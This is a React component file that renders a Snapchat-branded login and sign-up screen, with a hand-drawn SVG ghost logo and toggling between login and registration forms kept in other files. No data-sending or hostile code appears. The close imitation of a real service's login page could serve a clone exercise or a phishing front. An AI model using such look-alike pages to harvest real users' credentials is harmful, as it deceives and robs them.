import React, { useState } from "react";
import LoginForm from "./LoginForm";
import RegisterForm from "./RegisterForm";
import "./App.css";

// Authentic Snapchat Ghost Logo Component
const SnapchatLogo = () => (
  <svg width="100" height="100" viewBox="0 0 100 100" className="snapchat-logo">
    <defs>
      <filter id="shadow" x="-20%" y="-20%" width="140%" height="140%">
        <feDropShadow dx="0" dy="2" stdDeviation="3" floodColor="rgba(0,0,0,0.1)"/>
      </filter>
    </defs>
    <path 
      fill="white" 
      filter="url(#shadow)"
      d="M50 10c-8.5 0-15.5 7-15.5 15.5 0 4 1.5 7.5 4 10.5v12c0 8 6.5 14.5 14.5 14.5h2c8 0 14.5-6.5 14.5-14.5V36c2.5-3 4-6.5 4-10.5C73.5 17 66.5 10 58 10h-8z"
    />
    <path 
      fill="white" 
      filter="url(#shadow)"
      d="M28 55c-2 0-3.5 1.5-3.5 3.5s1.5 3.5 3.5 3.5c1 0 1.9-.4 2.5-1.1.3.8 1.1 1.4 2 1.4 1.2 0 2.2-1 2.2-2.2 0-.6-.2-1.1-.6-1.5.4-.3.6-.8.6-1.3 0-1-.8-1.8-1.8-1.8-.5 0-.9.2-1.2.5-.3-.6-.9-1-1.7-1z"
    />
    <path 
      fill="white" 
      filter="url(#shadow)"
      d="M72 55c2 0 3.5 1.5 3.5 3.5s-1.5 3.5-3.5 3.5c-1 0-1.9-.4-2.5-1.1-.3.8-1.1 1.4-2 1.4-1.2 0-2.2-1-2.2-2.2 0-.6.2-1.1.6-1.5-.4-.3-.6-.8-.6-1.3 0-1 .8-1.8 1.8-1.8.5 0 .9.2 1.2.5.3-.6.9-1 1.7-1z"
    />
    <path 
      fill="white" 
      filter="url(#shadow)"
      d="M34.5 62.5v12c0 4.5 3.5 8 8 8h15c4.5 0 8-3.5 8-8v-12c0-2-1.5-3.5-3.5-3.5h-24c-2 0-3.5 1.5-3.5 3.5z"
    />
    <circle fill="white" filter="url(#shadow)" cx="42" cy="32" r="2.5"/>
    <circle fill="white" filter="url(#shadow)" cx="58" cy="32" r="2.5"/>
    <path 
      fill="white" 
      filter="url(#shadow)"
      d="M45 40c0 2.5 2.2 4.5 5 4.5s5-2 5-4.5-2.2-4.5-5-4.5-5 2-5 4.5z"
    />
  </svg>
);

function App() {
  const [showLogin, setShowLogin] = useState(true);

  return (
    <div className="snapchat-container">
      <div className="logo-container">
        <SnapchatLogo />
        <h1 className="app-title">Snapchat</h1>
      </div>

      {showLogin ? (
        <div className="form-container">
          <LoginForm />
          <div className="divider">
            <span>or</span>
          </div>
          <button className="secondary-btn" onClick={() => setShowLogin(false)}>
            Sign Up
          </button>
        </div>
      ) : (
        <div className="form-container">
          <RegisterForm />
          <div className="divider">
            <span>or</span>
          </div>
          <button className="secondary-btn" onClick={() => setShowLogin(true)}>
            Log In
          </button>
        </div>
      )}
    </div>
  );
}

export default App;